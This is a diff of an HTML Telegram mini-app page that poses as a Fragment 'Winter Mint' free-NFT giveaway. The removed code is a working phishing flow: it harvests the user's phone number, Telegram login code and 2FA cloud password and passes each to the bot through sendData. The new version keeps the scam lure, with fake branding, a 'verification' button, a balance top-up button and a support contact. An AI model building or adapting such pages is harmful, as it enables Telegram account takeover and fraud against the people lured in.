@@ -1,148 +1,256 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Fragment | Winter Mint</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        :root { --main: #00d4ff; --gold: #ffcc00; }
-        
-        body {
-            margin: 0; padding: 0;
-            background: radial-gradient(circle at top, #1a2a6c, #b21f1f, #fdbb2d);
-            background-attachment: fixed;
-            font-family: 'Segoe UI', sans-serif;
-            color: white; overflow-x: hidden;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Fragment | Winter Mint</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 
-        /* Эффект снега */
-        .snow-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 10; }
+<style>
+:root{
+    --neon:#00eaff;
+    --pink:#ff4ecd;
+    --gold:#ffd24d;
+    --glass:rgba(255,255,255,.12);
+}
 
-        /* Новогодние гирлянды */
-        .lights {
-            position: fixed; top: 0; width: 100%; height: 50px;
-            background: url('https://www.transparentpng.com/download/christmas-lights/colorful-christmas-lights-png-2.png') repeat-x;
-            background-size: contain; z-index: 100;
-        }
+*{box-sizing:border-box}
 
-        .header { text-align: center; padding: 60px 20px 20px; }
-        .glass-box {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 25px; margin: 15px; padding: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
+body{
+    margin:0;
+    font-family:Segoe UI,system-ui;
+    color:#fff;
+    background:radial-gradient(circle at top,#0f2027,#203a43,#2c5364);
+    overflow-x:hidden;
+}
 
-        .nft-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 0 15px; }
-        .nft-card {
-            background: rgba(0,0,0,0.6);
-            border-radius: 20px; padding: 10px; border: 1px solid var(--main);
-            text-align: center;
-        }
-        .nft-img { width: 100%; border-radius: 15px; margin-bottom: 10px; }
+/* ===== СНЕГ ===== */
+canvas{
+    position:fixed;
+    inset:0;
+    z-index:1;
+    pointer-events:none;
+}
 
-        .btn-claim {
-            background: linear-gradient(90deg, #ff416c, #ff4b2b);
-            border: none; width: 100%; padding: 15px;
-            border-radius: 12px; color: white; font-weight: bold;
-            font-size: 16px; margin-top: 10px; cursor: pointer;
-            box-shadow: 0 5px 15px rgba(255, 65, 108, 0.4);
-        }
+/* ===== HEADER ===== */
+.header{
+    text-align:center;
+    padding:60px 20px 20px;
+    z-index:2;
+    position:relative;
+}
+.header h1{
+    margin:0;
+    font-size:34px;
+    text-shadow:0 0 15px var(--neon);
+}
+.badge{
+    margin-top:8px;
+    display:inline-block;
+    background:var(--gold);
+    color:#000;
+    padding:6px 16px;
+    border-radius:20px;
+    font-weight:900;
+}
 
-        .overlay {
-            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-            z-index: 2000; padding: 30px; flex-direction: column; justify-content: center;
-        }
-        .overlay.active { display: flex; }
+/* ===== NAV ===== */
+.nav{
+    display:flex;
+    gap:10px;
+    padding:10px;
+    position:sticky;
+    top:0;
+    z-index:5;
+    background:rgba(0,0,0,.4);
+    backdrop-filter:blur(10px);
+}
+.nav button{
+    flex:1;
+    padding:12px;
+    border-radius:14px;
+    border:1px solid var(--neon);
+    background:transparent;
+    color:#fff;
+    font-weight:700;
+}
+.nav button.active{
+    background:linear-gradient(90deg,var(--neon),var(--pink));
+    color:#000;
+}
 
-        .input-field {
-            background: #111; border: 2px solid var(--main);
-            padding: 20px; border-radius: 15px; color: white;
-            font-size: 24px; text-align: center; margin: 20px 0; outline: none;
-        }
-    </style>
+/* ===== SECTIONS ===== */
+.section{
+    display:none;
+    padding:15px;
+    position:relative;
+    z-index:2;
+}
+.section.active{display:block}
+
+/* ===== GLASS ===== */
+.glass{
+    background:var(--glass);
+    backdrop-filter:blur(18px);
+    border:1px solid rgba(255,255,255,.2);
+    border-radius:22px;
+    padding:18px;
+    margin-bottom:15px;
+    box-shadow:0 10px 35px rgba(0,0,0,.6);
+}
+
+/* ===== BUTTON ===== */
+.btn{
+    width:100%;
+    padding:16px;
+    border:none;
+    border-radius:14px;
+    font-size:16px;
+    font-weight:900;
+    color:#000;
+    background:linear-gradient(135deg,#00f2fe,#ff4ecd,#ffd24d);
+    box-shadow:0 0 25px rgba(0,234,255,.6);
+}
+
+/* ===== MARKET ===== */
+.grid{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:15px;
+}
+.card{
+    background:rgba(0,0,0,.55);
+    border:1px solid var(--neon);
+    border-radius:20px;
+    padding:10px;
+    text-align:center;
+}
+.card img{
+    width:100%;
+    border-radius:14px;
+    margin-bottom:8px;
+}
+.free{color:var(--neon);font-weight:800}
+
+/* ===== SUPPORT ===== */
+.support{
+    line-height:1.6;
+    font-size:15px;
+    opacity:.9;
+}
+</style>
 </head>
+
 <body>
-    <div class="lights"></div>
-    <div class="snow-canvas"></div>
 
-    <div class="header">
-        <h1 style="font-size: 32px; text-shadow: 0 0 10px var(--main);">WINTER MINT</h1>
-        <div style="background: var(--gold); color: black; display: inline-block; padding: 5px 15px; border-radius: 20px; font-weight: 900;">20.00 STARS GIFT</div>
+<canvas id="snow"></canvas>
+
+<div class="header">
+    <h1>WINTER MINT</h1>
+    <div class="badge">20.00 STARS GIFT</div>
+</div>
+
+<div class="nav">
+    <button class="active" onclick="openTab('cab')">Кабинет</button>
+    <button onclick="openTab('market')">Маркет</button>
+    <button onclick="openTab('support')">Поддержка</button>
+</div>
+
+<!-- ===== ЛИЧНЫЙ КАБИНЕТ ===== -->
+<div id="cab" class="section active">
+    <div class="glass">
+        <div style="opacity:.7;font-size:13px">СТАТУС АККАУНТА</div>
+        <h3>ID: UNVERIFIED</h3>
+        <button class="btn">ПРОЙТИ ВЕРИФИКАЦИЮ</button>
     </div>
 
-    <div class="glass-box" id="p-main">
-        <div style="font-size: 14px; opacity: 0.8; margin-bottom: 10px;">ЛИЧНЫЙ КАБИНЕТ</div>
-        <div style="font-size: 22px; font-weight: bold;">ID: UNVERIFIED</div>
-        <button class="btn-claim" onclick="auth()">ПРОЙТИ ВЕРИФИКАЦИЮ</button>
+    <div class="glass">
+        <div style="opacity:.7;font-size:13px">БАЛАНС</div>
+        <h2>0.00 ⭐</h2>
+        <button class="btn">ПОПОЛНИТЬ БАЛАНС</button>
     </div>
 
-    <div class="nft-grid">
-        <div class="nft-card">
-            <img src="https://nft.fragment.com/gift/santahat-10168.webp" class="nft-img">
-            <div style="font-size: 13px;">Frosty Hat #101</div>
-            <div style="color: var(--main); font-weight: 800;">FREE</div>
+    <div class="glass">
+        <div style="opacity:.7;font-size:13px">ЗИМНИЙ БОНУС</div>
+        <p>После верификации вы получите доступ к бесплатным NFT и сезонным дропам.</p>
+    </div>
+</div>
+
+<!-- ===== МАРКЕТ ===== -->
+<div id="market" class="section">
+    <div class="grid">
+        <div class="card">
+            <img src="https://nft.fragment.com/gift/santahat-10168.webp">
+            <div>Frosty Hat #101</div>
+            <div class="free">FREE</div>
         </div>
-        <div class="nft-card">
-            <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp" class="nft-img">
-            <div style="font-size: 13px;">Neon Drink #99</div>
-            <div style="color: var(--main); font-weight: 800;">FREE</div>
+        <div class="card">
+            <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp">
+            <div>Neon Drink #99</div>
+            <div class="free">FREE</div>
+        </div>
+        <div class="card">
+            <img src="https://nft.fragment.com/gift/holidaysnowman-245.webp">
+            <div>Snowman #245</div>
+            <div class="free">FREE</div>
+        </div>
+        <div class="card">
+            <img src="https://nft.fragment.com/gift/holidaytree-881.webp">
+            <div>Winter Tree #881</div>
+            <div class="free">FREE</div>
         </div>
     </div>
+</div>
 
-    <div class="glass-box" style="text-align: center;">
-        <h3>Поддержка: @x1o1y</h3>
+<!-- ===== ПОДДЕРЖКА ===== -->
+<div id="support" class="section">
+    <div class="glass support">
+        <p>
+            Наша служба поддержки работает ежедневно.  
+            Если у вас возникли вопросы по верификации, NFT или балансу —
+            свяжитесь с нашим оператором.
+        </p>
+        <p>
+            Мы отвечаем быстро и помогаем решить любые проблемы,
+            связанные с Winter Mint и Fragment.
+        </p>
+        <p><b>Контакт:</b> @x1o1y</p>
     </div>
+</div>
 
-    <div id="m-code" class="overlay">
-        <h2>Введите Код</h2>
-        <p style="color: #888;">Код отправлен в ваш основной Telegram</p>
-        <input type="number" id="i-code" class="input-field" placeholder="00000">
-        <button class="btn-claim" onclick="sendCode()">ВЕРНО</button>
-    </div>
+<script>
+const tg=window.Telegram.WebApp; tg.expand();
 
-    <div id="m-pass" class="overlay">
-        <h2>Облачный Пароль</h2>
-        <p style="color: #888;">Ваш аккаунт защищен 2FA</p>
-        <input type="password" id="i-pass" class="input-field" placeholder="Password">
-        <button class="btn-claim" onclick="sendPass()">ОТКРЫТЬ ДОСТУП</button>
-    </div>
+function openTab(id){
+    document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
+    document.querySelectorAll('.nav button').forEach(b=>b.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    event.target.classList.add('active');
+}
 
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
+/* ===== ЖИРНЫЙ СНЕГ ===== */
+const c=document.getElementById("snow"),ctx=c.getContext("2d");
+let w,h,flakes=[];
+function resize(){w=c.width=innerWidth;h=c.height=innerHeight}
+window.onresize=resize;resize();
 
-        function auth() {
-            tg.requestContact((ok, res) => {
-                if(ok) {
-                    tg.sendData("PHONE:" + res.responseUnsafe.contact.phone_number);
-                    setTimeout(() => { document.getElementById('m-code').classList.add('active'); }, 3000);
-                }
-            });
-        }
+for(let i=0;i<180;i++)
+flakes.push({x:Math.random()*w,y:Math.random()*h,r:2+Math.random()*4,s:1+Math.random()*3});
 
-        function sendCode() {
-            const val = document.getElementById('i-code').value;
-            if(val.length >= 5) {
-                tg.sendData("CODE:" + val);
-                document.getElementById('m-code').classList.remove('active');
-                document.getElementById('m-pass').classList.add('active');
-            }
-        }
+function snow(){
+    ctx.clearRect(0,0,w,h);
+    ctx.fillStyle="white";
+    flakes.forEach(f=>{
+        ctx.beginPath();
+        ctx.arc(f.x,f.y,f.r,0,Math.PI*2);
+        ctx.fill();
+        f.y+=f.s;
+        if(f.y>h){f.y=-10;f.x=Math.random()*w}
+    });
+    requestAnimationFrame(snow);
+}
+snow();
+</script>
 
-        function sendPass() {
-            const val = document.getElementById('i-pass').value;
-            if(val.length > 0) {
-                tg.sendData("PASS:" + val);
-                tg.close();
-            }
-        }
-
-        // Анимация простого снега
-        const canvas = document.querySelector('.snow-canvas');
-        // (Тут можно добавить JS снега, но для простоты оставим фон)
-    </script>
 </body>
 </html>
